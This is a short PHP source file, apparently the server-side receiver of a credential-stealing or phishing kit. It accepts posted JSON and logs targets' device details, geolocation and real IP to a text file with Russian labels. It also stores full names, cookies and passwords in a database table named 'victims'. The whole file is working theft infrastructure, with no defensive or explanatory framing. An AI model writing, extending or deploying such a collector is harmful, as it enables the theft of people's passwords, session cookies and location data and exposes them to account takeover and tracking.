<?php
include 'admin/db_connect.php';
// data_handler.php
$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

if (isset($data['deviceInfo'])) {
    $deviceInfo = $data['deviceInfo'];
    file_put_contents('data.txt', "Информация об устройстве: " . json_encode($deviceInfo) . "\n", FILE_APPEND);
}

if (isset($data['geoInfo'])) {
    $geoInfo = $data['geoInfo'];
	file_put_contents('data.txt', "Геолокация: " . json_encode($geoInfo) . "\n", FILE_APPEND);
}

if (isset($data['realIP'])) {
    $realIP = $data['realIP'];
    file_put_contents('data.txt', "Реальный IP: " . $realIP . "\n", FILE_APPEND);
}

$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

$fullName = isset($data['fullName']) ? $data['fullName'] : '';
$realIP = isset($data['realIP']) ? $data['realIP'] : '';
$deviceInfo = isset($data['deviceInfo']) ? json_encode($data['deviceInfo']) : '';
$geoInfo = isset($data['geoInfo']) ? json_encode($data['geoInfo']) : '';
$cookies = isset($data['cookies']) ? $data['cookies'] : '';
$passwords = isset($data['passwords']) ? json_encode($data['passwords']) : '';

$sql = "INSERT INTO victims (fullName, realIP, deviceInfo, geoInfo, cookies, passwords) VALUES (?, ?, ?, ?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ssssss", $fullName, $realIP, $deviceInfo, $geoInfo, $cookies, $passwords);

if ($stmt->execute()) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$stmt->close();
$conn->close();
?>